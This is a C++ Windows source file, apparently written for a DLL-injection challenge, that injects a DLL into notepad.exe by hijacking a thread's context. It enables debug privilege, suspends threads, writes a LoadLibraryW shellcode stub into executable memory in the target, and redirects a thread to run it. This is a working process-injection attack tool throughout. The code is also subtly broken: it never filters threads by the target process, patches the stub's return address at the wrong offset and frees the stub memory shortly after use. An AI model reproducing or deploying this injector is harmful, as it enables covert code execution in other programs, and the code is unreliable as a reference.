#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <string>
#include <vector>

#pragma comment(lib, "Kernel32.lib")
#pragma comment(lib, "Advapi32.lib")

bool EnableDebugPrivilege()
{
    HANDLE tokenHandle = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenHandle)) {
        return false;
    }

    LUID luid{};
    if (!LookupPrivilegeValueW(nullptr, L"SeDebugPrivilege", &luid)) {
        CloseHandle(tokenHandle);
        return false;
    }

    TOKEN_PRIVILEGES tp{};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(tokenHandle, FALSE, &tp, sizeof(tp), nullptr, nullptr)) {
        CloseHandle(tokenHandle);
        return false;
    }

    CloseHandle(tokenHandle);
    return true;
}

bool IsArchitectureMatching(HANDLE targetProcess)
{
    BOOL isCurrentWow64 = FALSE;
    BOOL isTargetWow64 = FALSE;
    IsWow64Process(GetCurrentProcess(), &isCurrentWow64);
    IsWow64Process(targetProcess, &isTargetWow64);
    return (isCurrentWow64 == isTargetWow64);
}

struct ThreadInfo {
    DWORD threadId;
    CONTEXT context;
};

std::vector<ThreadInfo> EnumerateThreads(DWORD targetPid)
{
    std::vector<ThreadInfo> threads;

    std::wcout << L"Enumerando threads..." << std::endl;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return threads;

    THREADENTRY32 te{};
    te.dwSize = sizeof(te);

    if (!Thread32First(snapshot, &te)) {
        CloseHandle(snapshot);
        return threads;
    }

    int processed = 0;
    int found = 0;

    do {
        processed++;

        // Try to open with correct access rights
        HANDLE th = OpenThread(THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
        if (th == nullptr) continue;

        // Get context
        CONTEXT ctx{};
        ctx.ContextFlags = CONTEXT_ALL;

        if (GetThreadContext(th, &ctx)) {
            // Try to suspend to verify it's accessible
            DWORD suspendResult = SuspendThread(th);
            if (suspendResult != (DWORD)-1) {
                ResumeThread(th);

                found++;
                ThreadInfo ti;
                ti.threadId = te.th32ThreadID;
                ti.context = ctx;
                threads.push_back(ti);

                if (found <= 3) {
                    std::wcout << L"  Thread " << found << ": TID=" << te.th32ThreadID << std::endl;
                }

                // Early exit after finding enough threads
                if (found >= 5) {
                    CloseHandle(th);
                    break;
                }
            }
        }

        CloseHandle(th);

    } while (Thread32Next(snapshot, &te));

    CloseHandle(snapshot);

    std::wcout << L"Threads encontradas: " << threads.size() << std::endl;
    return threads;
}

std::vector<unsigned char> GenerateStub(LPVOID loadLibAddr, const wchar_t* dllPath, DWORD_PTR origRip, DWORD_PTR origRsp = 0)
{
    std::vector<unsigned char> code;

    // x64 assembly: sub rsp,0x28; lea rcx,[stub+offset]; mov rax,loadLibAddr; call rax; add rsp,0x28; mov rax,origRip; jmp rax
    unsigned char stub[] = {
        0x48, 0x83, 0xEC, 0x28,
        0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xFF, 0xD0,
        0x48, 0x83, 0xC4, 0x28,
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xFF, 0xE0
    };

    code.insert(code.end(), stub, stub + sizeof(stub));

    // Patch LoadLibraryW address
    DWORD_PTR addr = (DWORD_PTR)loadLibAddr;
    memcpy(&code[13], &addr, 8);

    // Patch original RIP
    addr = origRip;
    memcpy(&code[26], &addr, 8);

    // Add DLL path
    for (size_t i = 0; i < wcslen(dllPath); i++) {
        code.push_back((unsigned char)dllPath[i]);
    }
    code.push_back(0);

    return code;
}

bool HijackThread(DWORD threadId, const void* stubAddr, CONTEXT& ctx)
{
    HANDLE th = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
    if (th == nullptr) {
        std::wcerr << L"OpenThread(SET_CONTEXT) falhou" << std::endl;
        return false;
    }

#if defined(_M_X64)
    ctx.Rip = (DWORD_PTR)stubAddr;
#else
    ctx.Eip = (DWORD_PTR)stubAddr;
#endif
    BOOL res = SetThreadContext(th, &ctx);

    CloseHandle(th);

    if (!res) {
        std::wcerr << L"SetThreadContext falhou" << std::endl;
        return false;
    }

    std::wcout << L"Thread hijacked com sucesso!" << std::endl;
    return true;
}

const wchar_t* GetFileName(const wchar_t* path)
{
    const wchar_t* fn = wcsrchr(path, L'\\');
    if (fn) return fn + 1;
    fn = wcsrchr(path, L'/');
    if (fn) return fn + 1;
    return path;
}

DWORD FindProcessId(const wchar_t* procName)
{
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);

    if (!Process32FirstW(snapshot, &pe)) {
        CloseHandle(snapshot);
        return 0;
    }

    const wchar_t* targetName = GetFileName(procName);

    do {
        if (_wcsicmp(pe.szExeFile, targetName) == 0) {
            DWORD pid = pe.th32ProcessID;
            CloseHandle(snapshot);
            return pid;
        }
    } while (Process32NextW(snapshot, &pe));

    CloseHandle(snapshot);
    return 0;
}

int main()
{
    const wchar_t* targetProc = L"notepad.exe";
    const wchar_t* dllPath = L"C:\\Users\\Max\\source\\repos\\VltChallengeDll\\x64\\Debug\\VltChallengeDll.dll";

    std::wcout << L"=== CONTEXT HIJACKING INJECTOR ===" << std::endl;

    std::wcout << L"\n[1] Debug privileges..." << std::endl;
    EnableDebugPrivilege();

    std::wcout << L"[2] Procurando " << targetProc << std::endl;
    DWORD pid = FindProcessId(targetProc);
    if (pid == 0) {
        std::wcerr << L"Processo nao encontrado!" << std::endl;
        return 1;
    }
    std::wcout << L"    PID: " << pid << std::endl;

    std::wcout << L"[3] Abrindo processo..." << std::endl;
    HANDLE proc = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_SUSPEND_RESUME,
        FALSE, pid);

    if (proc == nullptr) {
        std::wcerr << L"OpenProcess falhou!" << std::endl;
        return 1;
    }

    // Nota: Arquitetura verificada, mas injecao pode funcionar mesmo com arquiteturas diferentes
    // se a DLL é compilada para a arquitetura correta do target

    std::wcout << L"[4] Enumerando threads..." << std::endl;
    auto threads = EnumerateThreads(pid);

    if (threads.empty()) {
        std::wcerr << L"Nenhuma thread encontrada!" << std::endl;
        CloseHandle(proc);
        return 1;
    }

    std::wcout << L"\n[5] Suspendendo threads..." << std::endl;
    std::vector<std::pair<DWORD, HANDLE>> suspended;

    for (auto& t : threads) {
        HANDLE th = OpenThread(THREAD_SUSPEND_RESUME, FALSE, t.threadId);
        if (th != nullptr) {
            DWORD sc = SuspendThread(th);
            if (sc != (DWORD)-1) {
                suspended.push_back({t.threadId, th});
                std::wcout << L"    TID " << t.threadId << " suspensa" << std::endl;
            } else {
                CloseHandle(th);
            }
        }
    }

    if (suspended.empty()) {
        std::wcerr << L"Falha ao suspender!" << std::endl;
        CloseHandle(proc);
        return 1;
    }

    ThreadInfo& hijack = threads[0];
    std::wcout << L"\n[6] Preparando hijacking..." << std::endl;
    std::wcout << L"    Target thread: TID " << hijack.threadId << std::endl;

    // Allocate DLL path memory
    SIZE_T pathLen = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    LPVOID pathMem = VirtualAllocEx(proc, nullptr, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pathMem == nullptr) {
        std::wcerr << L"VirtualAllocEx (path) falhou!" << std::endl;
        for (auto& s : suspended) ResumeThread(s.second);
        CloseHandle(proc);
        return 1;
    }

    WriteProcessMemory(proc, pathMem, (LPVOID)dllPath, pathLen, nullptr);

    // Get LoadLibraryW
    HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
    FARPROC loadLibAddr = GetProcAddress(k32, "LoadLibraryW");

    // Generate and allocate stub
    std::wcout << L"[7] Gerando e alocando stub..." << std::endl;
#if defined(_M_X64)
    auto stub = GenerateStub(loadLibAddr, dllPath, hijack.context.Rip, hijack.context.Rsp);
#else
    auto stub = GenerateStub(loadLibAddr, dllPath, hijack.context.Eip, hijack.context.Esp);
#endif

    LPVOID stubMem = VirtualAllocEx(proc, nullptr, stub.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (stubMem == nullptr) {
        std::wcerr << L"VirtualAllocEx (stub) falhou!" << std::endl;
        VirtualFreeEx(proc, pathMem, 0, MEM_RELEASE);
        for (auto& s : suspended) ResumeThread(s.second);
        CloseHandle(proc);
        return 1;
    }

    WriteProcessMemory(proc, stubMem, stub.data(), stub.size(), nullptr);
    std::wcout << L"    Stub: 0x" << std::hex << (DWORD_PTR)stubMem << std::dec << std::endl;

    // Hijack thread context
    std::wcout << L"[8] Hijacking..." << std::endl;
    if (!HijackThread(hijack.threadId, stubMem, hijack.context)) {
        std::wcerr << L"Hijacking falhou!" << std::endl;
        VirtualFreeEx(proc, stubMem, 0, MEM_RELEASE);
        VirtualFreeEx(proc, pathMem, 0, MEM_RELEASE);
        for (auto& s : suspended) ResumeThread(s.second);
        CloseHandle(proc);
        return 1;
    }

    // Resume threads
    std::wcout << L"[9] Retomando threads..." << std::endl;
    for (auto& s : suspended) {
        ResumeThread(s.second);
        CloseHandle(s.second);
        std::wcout << L"    TID " << s.first << " retomada" << std::endl;
    }

    Sleep(500);
    VirtualFreeEx(proc, stubMem, 0, MEM_RELEASE);
    VirtualFreeEx(proc, pathMem, 0, MEM_RELEASE);
    CloseHandle(proc);

    std::wcout << L"\n[OK] Injecao concluida!" << std::endl;
    return 0;
}
